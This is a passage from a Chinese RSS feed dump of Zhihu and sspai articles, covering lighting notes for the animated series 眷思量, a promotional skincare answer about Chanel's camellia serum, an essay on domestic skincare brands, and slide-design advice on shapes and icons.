src=\"https://pic1.zhimg.com/v2-08e6d511e8800f09c80b3741ce08d77e_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"1112\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-08e6d511e8800f09c80b3741ce08d77e\" data-watermark-src=\"v2-61804266ec66dde178f58953bfafc33f\" data-private-watermark-src=\"v2-7379929706b521c1fbac8c4b8004e098\"></p>\n<p>后面场次里丽崽面光这个例子也可以作为一个典型案例拿来分析下。如下图，</p>\n<p>灯光原图看起来像底光，且眼神光位置不对，达不到我需要的灵动的望着天空感怀的眼神，于是提出调整天光方向，配合眼神光角度，做到夜晚光下的和谐，及镜头含义的传递。改变有时就是需要微调即可。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-05b1ebed3d202a41c6a7998c658916a9_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2207\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-05b1ebed3d202a41c6a7998c658916a9\" data-watermark-src=\"v2-39cbd9bca2126a53121d80633beeb2ab\" data-private-watermark-src=\"v2-209990662104fda388efef79753bd7e7\"></p>\n<p>11集最后一场，也是同理，玄哥在岩石后原本正常的灯光很暗，需要在和谐度内去提亮，以不影响本场夜晚灯光的表达。又能看清角色面部神情为主。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a2c6c5eb27aac92585fb06914c917d02_720w.jpg?rss\" data-rawwidth=\"1133\" data-rawheight=\"536\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a2c6c5eb27aac92585fb06914c917d02\" data-watermark-src=\"v2-4d6640cadda9f5f69e9f68775e3147e5\" data-private-watermark-src=\"v2-2baad8510e99b84d5bd4f2faa65df44f\"></p>\n<p>好啦！先分享到这里，这次真的有花很多时间努力写了，算是回报知乎小伙伴的催更和支持！下次再聊。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhao-yu-qing-95-43?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">赵禹晴</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/480037354/answer/2066582680?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">26 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/478348101?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第十集？</a><br><a href=\"http://www.zhihu.com/question/476668782?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价国产动画《眷思量》第九集？</a><br>\n","link":"http://www.zhihu.com/question/480037354/answer/2066582680?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"可以推荐好用保湿、抗衰精华吗？","date":"2021-08-17 11:00:11","description":"\n<p>因为日常有参与皮肤管理的工作，所以，关于好用的保湿产品这件事我一直都在聆听不同年龄段、不同肤质的女性的意见，发现大家近几年对保湿这件事的看法，还是有蛮大变化的。</p>\n<p>最明显的一个变化应数<b>对保湿的重视程度升高。</b>以前很多人说起护肤，都会把重点放在抗衰老上，毕竟不管油皮干皮混合皮，随着年龄的增长，都绕不开除皱抗衰老这个大主题，但最近几年随着护肤科普的普及，大家开始意识到“皮肤屏障”这个东西，<b>良好的保湿是维护正常皮肤屏障、生理功能，以及延缓皮肤衰老的基础。</b>地基牢才能建起好房子，所以保湿被越来越多人重视起来，在我看来这是一件好事。</p>\n<p>皮肤屏障是一层“砖墙”般的结构，表皮细胞如同“砖块”，而联结砖块的“水泥砂浆”则是以天然保湿因子（natural moisturizing factor，NMF）为主的细胞间脂质，在砖墙的最外层，还有一层由神经酰胺、胆固醇等油脂共同形成的“腻子”，这就是我们的皮脂膜。它们共同构成了我们的皮肤屏障。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a2a1fe9f5088b566d2c0aca491e98534_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1914\" data-rawheight=\"788\" data-watermark=\"watermark\" data-original-src=\"v2-a2a1fe9f5088b566d2c0aca491e98534\" data-watermark-src=\"v2-4caf520501ab3057be92a2247bba1621\" data-private-watermark-src=\"v2-8bed250b10ce1cdaf59977966204660c\"></p>\n<p>皮肤屏障作为人最浅表的一道防线，每时每刻都在帮助我们控制体内水分不要过快丢失，并且抵御紫外线、致病菌、过敏原等外来刺激的伤害。</p>\n<ul>\n<li>当皮肤得到良好的保湿时，屏障完整，细胞间脂质和皮脂膜将经皮失水率控制在合理的范围内，皮肤总能维持正常的弹性、细腻的外观，对各种外界刺激能及时进行自主的修复；</li>\n<li>而当皮肤处于乏脂状态时，表皮细胞间的联结是欠紧密的，经皮失水就会升高，皮肤变得粗糙、脆弱，正常的生理活动受到影响，外界的各种刺激都更容易造成伤害。</li>\n</ul>\n<p>从这个层面上说，其实是“<b>不保湿，无功效</b>”，没有良好的保湿作为基础，无论是美白、抗衰还是别的什么功效，就都无从谈起。25以上的女性总是特别关心产品有没有抗衰的功能，但保湿都没有认真做好，这是本末倒置的，<b>重视保湿，才是回归护肤的本质。</b></p>\n<p>但最近数年我还发现，人们在重视保湿的同时，又比以往更期望肤感轻盈。这不能不说是一个小小“悖论”。传统的保湿剂很难做到两全，因为它们无非是从油到水的渐变。</p>\n<ul>\n<li>\n<b>油剂</b>最为保湿，譬如说凡士林就是一种纯油脂，它的封包性能很强，能高效锁水，但肤感奇差，油腻厚重；</li>\n<li>单纯的<b>水剂</b>非常轻爽，但简直不配被称为“保湿剂”，它什么也锁不住，抹到皮肤上不一会儿就挥发了。</li>\n</ul>\n<p>市面上最常见的各种保湿产品，大多是各种各样的<b>乳霜</b>，也就是油脂乳化后和水共同形成的混合物。油多一些的，便叫“油包水”，水占比更大的，便叫“水包油”，但总体的特性依然是越保湿的，肤感越厚重，而越轻盈的，其实就不那么保湿。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-86f44559e32aa68aa78372bf7722ffd9_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2076\" data-rawheight=\"1127\" data-watermark=\"watermark\" data-original-src=\"v2-86f44559e32aa68aa78372bf7722ffd9\" data-watermark-src=\"v2-3706c868392e8e5c5b8e70ef1dcb9ee8\" data-private-watermark-src=\"v2-f29d3f46856922b3d5611300183d1c06\"></p>\n<p>难道就没有两全之计吗？精细化工行业做了很多尝试。比如加酒精可以在不减少油脂含量的情况下，使乳霜的肤感变得清爽，但酒精对皮肤的刺激也需要被考虑。最近十余年我国都市女性中敏感皮肤的占比越来越高，这使得我常常不敢轻易推荐含酒精的护肤品。</p>\n<p>利用高分子溶液制成<b>凝胶剂</b>（gel），其内部可以装载大量水分，制成的保湿剂肤感轻盈，但单纯的凝胶相对乳液（lotion）、霜剂（cream）来说，仍然不够保湿。</p>\n<p>精细化工作出了更多的尝试，比如<b>在凝胶的清爽基质中嵌入独立微囊，</b>以达到同步装载丰富脂质，润养皮肤的功效。这方面的代表作应数香奈儿山茶花润泽微精华了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3bbf7aaa8d8fec0ca476c1ae6969afff_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1269\" data-rawheight=\"952\" data-watermark=\"watermark\" data-original-src=\"v2-3bbf7aaa8d8fec0ca476c1ae6969afff\" data-watermark-src=\"v2-558fb46e317e0f23d51fd6783a138247\" data-private-watermark-src=\"v2-adba9a30590f7a85bf521b5ed899c1b3\"></p>\n<p>该产品在国内初上市的时间是2015年，它是香奈儿与哈佛大学物理学者David Weitz合作，共同研发的微流体科技带来的产品，作为最早一批将该技术应用在日常护肤品上的保湿系列，可以说是非常具有市场前瞻性了。</p>\n<p>在每瓶山茶花润泽微精华水中，都蕴含了5000粒以上的独立微囊，刚上脸时水润清爽，但微囊中丰富的脂质亲肤即融，既像水般轻盈清新，又像乳液般细腻丰润。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9a2f1aed104d834b594da4c18554c6ed_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2480\" data-rawheight=\"1653\" data-watermark=\"watermark\" data-original-src=\"v2-9a2f1aed104d834b594da4c18554c6ed\" data-watermark-src=\"v2-1d4ab727a7cd0fa950828fcb3d0de197\" data-private-watermark-src=\"v2-e3d5e78fa4268b90c3dca4e3ab3b1d80\"></p>\n<p>独立微囊为什么能够稳定地悬浮其中呢？这就是微流体科技奇妙的地方了。通过流动过程高速可控的微流体系统，逐个塑造出理想大小的独立微囊，在如此微观的尺寸下，毛细力作用将大于重力作用，再采用复合凝聚法确保微囊性质稳定，功效卓越的脂溶性活性成分就得以完好封存于微囊核心，并均匀分布于产品中。</p>\n<p>但香奈儿并不满足于此，为了满足不同产品线对于质地和技术应用的不同要求，不断挑战，并为此特别定制了专门的生产机械与流水线，就为了确保独立微囊在此系列产品中完好无损且分布均匀，且仅在涂抹于面部时迸裂，释放润泽功效。如此便<b>不需要添加任何酒精、表面活性剂，</b>也可以在精华、精华水、面霜、眼部精华等多款不同类型的产品中都做到<b>“锁水”和“似水”两全。</b></p>\n<p>独立微囊不仅让强力保湿和轻盈肤感得以并存，同时还创造了<b>更多的可能性——可以更好承载活性成分，助其穿透表皮深入肌底。</b>比如香奈儿引以为傲的山茶花中，蕴含着两种不同极性的活性成分：</p>\n<ul>\n<li>\n<b>脂溶性的山茶花精萃油OFA：</b>一种具有优良亲肤性的天然油性活性分子。它能活化表皮中的某些特定关键酶，促进角蛋白的合成及角质细胞成熟。由此来强化皮肤屏障中的“砖块”。</li>\n<li>\n<b>水溶性的山茶花精华PFA：</b>通过作用于过氧化物酶体增殖物激活受体（peroxisome proliferators-activated receptors，PPARs），山茶花PFA可以促进表皮脂质尤其是天然保湿因子的合成，即补充皮肤屏障中的“水泥砂浆”。</li>\n</ul>\n<p>两相配合，共同构建更健康、强韧的皮肤屏障，便不易因外界侵扰、伤害而发生皮肤老化。它们都取自山茶花，但它们一个是脂溶性的，一个是水溶性的，是独立微囊让它们得以共存。</p>\n<p>一些油性或者混合性皮肤的女性很不喜欢使用保湿，特别在夏季，总觉得脸上已经很油了，根本不想抹东西。但这个想法实在不可取。因为<b>皮肤的油脂分泌是一个动态平衡</b>，越是素面朝天，皮肤越会感觉到泌油只能靠自己了，皮脂腺都哗哗地鼓足动力往外泵油。而<b>适当地补充细胞间的天然保湿因子，才会让皮脂腺冷静下来，皮肤慢慢恢复一个哑光的细腻外观。</b></p>\n<p>对于皮肤较为干燥的女性，则可以在山茶花微精华后衔接同系列的<b>山茶花润泽微精华乳霜</b>，也就是大名鼎鼎的气泡面霜。这款面霜不仅同样使用了独立微囊调控肤感，乳霜中还会含有更丰富的<b>蓝姜PFA，</b>有助于促进皮肤生成超氧化物歧化酶（SOD），对抗外源性损伤带来的氧自由基，为肌肤撑起一顶巨大的抗氧化\"保护伞\"，就更适合皮肤干燥、易出现初老干纹的人群。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-750fd5e0c97b5baebb91c0a1318c759e_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"597\" data-rawheight=\"896\" data-watermark=\"watermark\" data-original-src=\"v2-750fd5e0c97b5baebb91c0a1318c759e\" data-watermark-src=\"v2-f0b50168af5c71a4d9e9e04ff0153170\" data-private-watermark-src=\"v2-c5b40d5243ceefd5528b5d33aa9d3b64\"></p>\n<p>这是我很乐意在皮肤管理中向咨询者推荐的一个保湿组合。尤其是夏季即将到来，阳光毒辣，汗也流的比往常更多，水分流失速度更快，更加需要清爽好用的保湿产品来维持肌肤水油平衡，重回水润光泽。</p>\n<p>我曾无意间看到过一个视频短片，介绍香奈儿研究中心如何将种植于法国西南部的白色千层山茶花进行手工采摘，并将天鹅绒般的花瓣送至实验室进行萃取的。</p>\n<a href=\"http://link.zhihu.com/?target=https%3A//v.qq.com/x/page/z0943y5dzpl.html\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-8ed92c32ccb584c11cd8e53b5beabb66_bh.jpg\" data-image-width=\"320\" data-image-height=\"180\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">香奈儿护肤的奥秘_腾讯视频</a><p>这些背后的故事让我不禁想感叹下一瓶好用的精华，真是暗藏了许许多多研发和工作人员的日夜努力。每一个成分，每一种工艺，都是离不开科技的加持和品牌的用心啊。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/chen-yu-lan-25?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">陈语岚</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/58638740/answer/1901671668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">97 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/389922296?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">20岁之前买精华是先买补水精华还是美白精华？</a><br><a href=\"http://www.zhihu.com/question/64794559?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">22岁进23岁，开始用补水的精华了 ，现在有必要用抗皱吗？</a><br>\n","link":"http://www.zhihu.com/question/58638740/answer/1901671668?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国物馆 | 十年以后我为什么开始信赖国货护肤品？","date":"2021-08-17 09:29:08","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<p><a href=\"https://sspai.com/post/66881\" target=\"_blank\">上一篇文章写了我在 618 等大促期间守住钱包的思路，</a>里面提到了因为爱好护肤，并乐于尝试各种护肤品，所以我倾向于花更少的钱找代购买正装，而非给通过赠品、小样实现折扣的方式付费。另一方面，在复盘上半年的消费时，发觉到我的护肤品消费逐渐从国外品牌转移到了国内品牌，不禁对这样的变化感到好奇，是因为我的消费思路转变导致我更在意价格，所以选择了国货护肤品，还是有什么其他原因让我乖乖掏钱。</p>\n<p>本文通过梳理我作为普通消费者的护肤品购买记录和使用感受，结合护肤品行业市场调研与分析结果，尝试去探寻国货护肤品的崛起之路。</p>\n<h2>我的十年护肤之路</h2>\n<p>我的护肤经历可能跟很多女性朋友类似，进入大学后学业没那么重了，开始研究「变美」这件事，我的着力点就在于护肤。差不多 2012 年，我的主要购买渠道是百货商场的专柜，因为买不起欧美大牌，又出于安全考虑，就用了上海家化旗下的佰草集。那段时间我用过新玉润系列、新逆时恒美系列和新七白系列，有化妆水、乳液、眼霜、面膜等单品。虽说不算护肤启蒙产品，但也陪伴了我好几年，只不过当时我没有成形的护肤思路，听听柜姐的介绍，去网上<sup class=\"ss-footnote\" href=\"\" title=\"还是PC时代\" footnote-id=\"1\">1</sup>搜搜相关信息，就觉得自己是在用对的产品了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/6bdec843ef0691648fdd9cae9f20390b.png\"><figcaption>基于隐私考虑，订单截图隐藏了订单号及购买时间</figcaption></figure><p>毕业后进入互联网行业，随着接收的资讯变多，认识的护肤品品牌也增加了，我开始转向国外的护肤品牌。购买渠道从专柜逐渐转移到免税店和线上（淘宝代购），一是那个时候收入不高而这两个渠道会便宜一些，二是能买到比我所在城市专柜更多的品牌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/4643aaf32d3b3a75358a25ed408c90bb.png\"><figcaption>只有淘宝的记录能找到了</figcaption></figure><p>2015 年到 2017 年这段时间，我认识到自己的肤质是偏中性，也会出油。脸上的胶原蛋白还算充足，基本诉求就是保湿。另外我还在意肤色暗沉，以及比同龄人深一些的法令纹。也是那个时候我开始在微博上关注一些博主，以及在小红书上看别人发布的护肤笔记，以此作为选购护肤品的依据。</p>\n<p>考虑到有些少数派的朋友不护肤或者不了解护肤到底在护什么的，这里简单介绍下。<strong>护肤就像是一个解决方案，它是「对症下药」</strong>，比如我喜欢画画和看剧，如果需要一台移动工具，那 iPad Pro 并配上 Apple Pencil 可能就是我的选择。在大众审美以及资本逐利的影响下，我们尝试去对抗地心引力，试图通过这个解决方案来优化外貌。又因为人的不同，每个人的诉求也不一样，所以没有唯一解。</p>\n<p>随着关注的博主变多，越来越发觉可以尝试的护肤品更多了，2018 到 19 年，物美价廉的日本护肤品成为了我的首选。因其适合亚洲人护肤，并且给我一种「润物细无声」的使用感受。就像在市场营销领域，会把品牌进行拟人化，在我看来，<strong>欧美护肤品牌是一个穿白大褂的专家形象</strong>，双手环抱在胸前，告诉你实验数据；<strong>日本品牌像是细致体贴的管家</strong>，当你走到桌前时只需自然坐下，椅子已被移动到位。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/4f3f8247f4c6c9b6d2f3f0bc27675a27.png\"><figcaption>2018 年至 2019 年</figcaption></figure><p>而在那时，我脑海里还没有中国护肤品牌的形象。</p>\n<p>直到在 19 年末，社交媒体中开始有了宣传国货的声音，不仅是护肤品还有其他消费品<sup class=\"ss-footnote\" href=\"\" title=\"如上篇文章所写的冲牙器\" footnote-id=\"2\">2</sup>。以及在我感受到部分博主为了赚钱而夸大护肤品效果，甚至根本没有长期使用只是进行摆拍后，对一些欧美品牌产生了抵触情绪，开始尝试国货品牌。</p>\n<p>另一方面，随着年龄的增长我的肤质发生了翻天覆地的变化，从普通的中性偏油变成了敏感的干皮，脸上的胶原蛋白迅速流失，法令纹日渐加深，所以我的护肤解决方案进入使用功能性的护肤品，追求更强烈的效果的阶段。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/87c4f365101c242eca77b0d99bb716b1.png\"><figcaption>2019 年至 2020 年</figcaption></figure><p>从上图的订单截图中护肤品的商品名称就可以看出，2019 年之前购买的护肤品，几乎都是基本的功效，如补水保湿，除了说明这个商品是什么，洗面奶还是防晒乳，卸妆油还是面膜，没有其余的关键词。而 2020 年购入的国货护肤品很好地契合了我的需求，应对换季过敏的、淡化黑眼圈细纹的、抗衰的、提亮的，<strong>并把产品成分直接放在了标题上</strong>。</p>\n<p>最重要的一点是，淘宝直播逐渐崛起，帮助品牌实现了最高效的转化，以薇娅和李佳琦为首的主播，把原来用户要经历很多天、很多步骤的购物行为，直接缩短到进入直播间，听到「买它」后就马上下单。今年上半年，我几乎所有的国货护肤品都是在李佳琦直播间下单：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/c086d9922b26f08b00234d2cc49fdbd5.png\"><figcaption>2021 年</figcaption></figure><h2>那些值得推荐的好用国货</h2>\n<p>重新使用国货护肤品至今，给我最大的感受是惊喜。</p>\n<p>比如上水和肌的肌底液，因为那段时间身体经常过敏，皮肤也很敏感，抱着试一试的想法入手，没有对修复力抱有很高的期待，觉得 100 多块钱而已，如果不行就当做保湿的产品使用好了。结果用了一段时间，感觉比预期效果好，确实有一定的修复力，皮肤状态逐渐稳定下来，白天晚上都用它，很快就空瓶了。</p>\n<p>还有在 UNISKIN，之前就看到有博主推荐过，是一个有研发又有设计的新品牌，在看到直播间的价格更实惠后才入手。并且刚好这个品牌第一次与头部主播合作，非常有诚意，买眼霜送洗面奶。虽然没有商品标题写的那么丰富和显著的功效，使用下来感受也不差的，不会长脂肪粒，有保湿效果，稍微能对抗黑眼圈。</p>\n<p>还有会进入我 2021 年度爱用品的华熙生物次抛玻尿酸，我分别用了润百颜蜂巢玻尿酸紧致次抛原液和夸迪 5D 玻尿酸安瓶精华次抛原液，夸迪 5D 玻尿酸水杨酸次抛原液。特别是润百颜的次抛，我喜欢在晚上的护肤步骤中使用，第二天肉眼可见皮肤变得充盈。还记得第一次使用时，我第二天醒来照镜子，对一个走向 30 岁的逐渐失去胶原蛋白的女性来说，看到自己脸上胶原蛋白回来了的那种失而复得的感受，我当下就理解了为什么有人愿意付钱做医美。<strong>华熙生物的次抛玻尿酸作用在我脸上，效果确实是非常明显</strong>。</p>\n<p>因为我对国货护肤品的期待不高，当实际收获比预期的多时，就觉得自己赚到了。以此开始，我在护肤品的选择上也更加倾向于国货。现阶段依然是追求功能性，并逐渐建立起了自己的护肤体系，有日常的，也有特殊场景的。如有机会，下次展开讲。</p>\n<h2>护肤行业永远在变</h2>\n<p>看完了我个人的护肤经历后，让我们把视角放大，看看护肤行业的发展。</p>\n<p>先回头去看刚结束的 618 大促，在护肤品类的销售榜单中，头部依然是国外品牌，欧莱雅集团连续 3 年蝉联第一。国货品牌中 2012 年创立的薇诺娜跻身第十位，进入第一梯队，也是国货品牌的第一名；珀莱雅跻身第 20 位；其他的国货品牌虽未进护肤品类前列，也在努力追赶。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/eb20930f60d562590d11c032a3e32c45.png\"><figcaption>来自开源证券研究所</figcaption></figure><p>从 2017 年和 2020 年我国护肤品市场占有率排行中可以看到，国外抢占了市场份额，并且上榜的都是知名品牌。国货品牌上榜数从 9 个降到 8 个，其中薇诺娜和 HFP 是 2019 年开始爆发的新品牌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/8fb4cb218cc07c6316fa8b983205afa1.png\"><figcaption>来自银河证券研究院</figcaption></figure><p>结合第一财经在今年 4 月份联合天猫美妆发布的行业报告中，把国货的发展分为了三个阶段：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/29/62f514320a030b86a0c62050b20523f5.jpeg\"></figure><p>个人感觉图上所说的 3.0 时代还不够详细。因为进入 2016 年后，消费者能够从「推荐」这种方式获取信息，而不仅仅靠「搜索」，小红书由人工改为了机器分发，同期抖音也上线了。进入 2018 年后，短视频开始爆发，推荐算法被大规模应用。国货品牌这几年通过线上渠道获得了爆发式增长。</p>\n<p>国货品牌的发展其实就体现在了我的消费路径上，最开始没有外部竞争，市场没有活力，消费意识也处于待开发状态。当越来越多的国外「鲶鱼」进入池塘，市场快速发生变化，消费者接收到更多信息，了解和学习护肤，心智被国外品牌培养了起来。老牌的国内品牌有了危机意识，行动却很慢。随着市场发展和外部环境的变化，一大批年轻的新品牌涌现到台前，消费者的需求被挖掘，护肤品功效也越来越细分。</p>\n<h2>后面</h2>\n<p>最后，我心中渐渐也有了中国护肤品牌的形象<sup class=\"ss-footnote\" href=\"\" title=\"这里主要是针对新品牌\" footnote-id=\"3\">3</sup>：像是一个实习医生，虽然毕业没多久，但先后在国内外高等学府接受教育。努力地积累临床经验，认真对待每一次手术。同时也紧跟国外同行的脚步，发现新的研究方向。只是会跟其他年轻人一样，有经济压力，需要更长的时间来证明自己，还有很长的路可以走。</p>\n<p> </p>\n","link":"https://sspai.com/post/68001"},{"title":"展示逻辑的更优解——用形状表达抽象信息","date":"2021-08-17 07:56:11","description":"\n<p>在上一篇文章中，我们正式进入「图像化」的阶段，从「图片」这个图像元素开始，谈到它的使用逻辑，也就是区分「传递信息」和「渲染情感」两种不同的使用情境。并搭配「简化─聚焦」的设计原则，来达成「图像化」的目的。</p>\n<p>然而，并不是所有的文字信息，都能以「图片」来做「图像化」。如果你想强调的重点信息，不是具体的事物，而是抽象的逻辑或概念，那我们就得换另一种图像元素了，也就是本篇要谈到的「形状」和「图标」。</p>\n<h2><strong>为什么我们需要使用「形状」？</strong></h2>\n<p>让我们先退回「结构化」的阶段，也就是刚完成了文字信息的排版，这时，你可能会发现，这一段的文字信息，并不能用单张或多张图片来置换。这是为什么呢？</p>\n<p>因为并不是所有的重点信息，都是具体的人事物。</p>\n<p>事实上，大多数经过梳理的文字内容，其重点可能更多是放在整体的逻辑架构，或者较为抽象的概念上。如果非得从中撷取一个具体的词汇，硬是用「图片」来呈现，就会显得本末倒置，甚至是图文不符了。</p>\n<p>举例来说，在电影领域有个编剧的方法，是由 Syd Field 提出的「电影三幕剧」，其中包括三个阶段，分别是「铺陈」、「冲突」和「解决」。这边我先将关于「电影三幕剧」的描述，以「结构化」的方式整理好，内容如下图：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/6fc33e3faec1ac8a1f71edef3276dcf9.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>当你看完整段「电影三幕剧」的文字描述，很容易就能看出，这三幕在逻辑架构上事先后次序的关系。</p>\n<p>这时，你肯定不会想找「图片」来呈现，而是直接在「铺陈」、「冲突」和「解决」这三个关键词，加入指向性的箭头，来呈现它们之间的次序关系。至于原本三个关键词底下的描述，直接口述就可以了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/5f48d8257ca02aec444f649fe9d876c3.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>从上面可以看出，「形状」在幻灯片设计时的作用，就是能<strong>更好地展现内容信息的逻辑关系</strong>。你不需要阅读完大段的文字，再来分析它隐含的逻辑是并列、包含、层级，或者是递进、循环等，而是第一眼就能先对整体的逻辑框架，有个清楚的认知，再来填补其中的内容细节。</p>\n<p>回到「电影三幕剧」这个例子，我们已经用「形状」处理好它的逻辑关系了。但其实「铺陈」、「冲突」和「解决」这三个关键词，还是比较抽象的。如果观众稍微走神，漏听一部分讲者的说明，可能乍看这三个字眼，还真不知道是什么意思。</p>\n<p>所以，我们可以将这张幻灯片，再搭配「图标」改进一下，这么一来，哪怕你没听到讲述，单单看这一页幻灯片，也能隐约猜到其中的意涵。再搭配听到的那些只字词组，也就八九不离十了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/16505cb7a417f97c52fa9317e1fd91ac.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>从上面的例子，我们可以看到，当你想<strong>展示的是内容的逻辑架构</strong>，那就使用「形状」；如果想<strong>表达关键词的抽象概念</strong>，那就使用「图标」。而这两者，都不是「图片」可以做到的。因此，想做好抽象信息的「图像化」，还是得搭配「形状」和「图标」才行。</p>\n<h2><strong>如何正确地使用「形状」？</strong></h2>\n<p>现在，我们知道在「图像化」这个阶段，不能一味地将「文字」替换成「图片」，而是需要根据你表达的重点，选择合适的图像素材。那究竟我们该怎么使用「形状」呢？照惯例，我们还是用信息角度来讨论。</p>\n<h2><strong>使用简洁的颜色和样式</strong></h2>\n<p>在上一篇文章，谈到「图片」元素的时候，我们说「图片」作为信息载体的特点，在于它丰富的视觉细节，这些细节可以帮我们完成更加直观且细腻的表达，比如：让信息的传递更加精准、让情感的渲染更加饱满。</p>\n<p>而「形状」这种图像元素则恰恰相反，它通常只有简单的几何形状或线条，没有太多的视觉细节。因此，当我们以「形状」作为信息载体时，更多的是利用它抽象的特性，来规范（形状）与连结（线条）信息，以更好地传达整体的逻辑关系。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/02/19/8aa7e673d1692a274bfc01ad6cd9881e.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>事实上，正是因为「形状」足够简单，才能更直觉地展现宏观的逻辑结构，而不被琐碎的信息所影响。把握这一点，你就能明白为何 PPT 里 SmartArt 的默认样式，那么不受人待见了。因为除了规范与连结，其它颜色、质感、三维效果等的添加，只会增加信息上的噪声而已。</p>\n<p>因此，如果我们想使用「形状」元素，那就用最简洁的颜色和样式就好。如此一来，才能回归它的本质，更好地展示内容信息的逻辑关系。</p>\n<h2><strong>保持风格的一致性</strong></h2>\n<p>再来我们看到「图标」，从信息强度来说，它是介于「图片」和「形状」两者之间的图像元素，也可以直接看作是用「形状」来对「图片」作简化描摹。这种简化让「图标」在去除细节的同时，也让它能够用来指涉更广泛的抽象概念。比如：我们在日常生活中，随处可见的交通号志、男厕女厕的标示、计算机或手机上的UI界面等。</p>\n<p>那当我们想使用「图标」的时候，又该注意什么呢？和使用「形状」的原则一样，要避免多余的颜色和样式。此外，使用「图标」还需要特别注意风格的一致性：</p>\n<ul>\n<li>单色图标不要和彩色图标混用；</li>\n<li>线条型图标不要和色块型图标混搭。</li>\n</ul>\n<p>从信息角度来说，道理都是一样的，就是避免过多的噪声干扰，让图像元素更好地发挥它的作用而已。</p>\n<figure class=\"image ss-img-wrapper\"><img 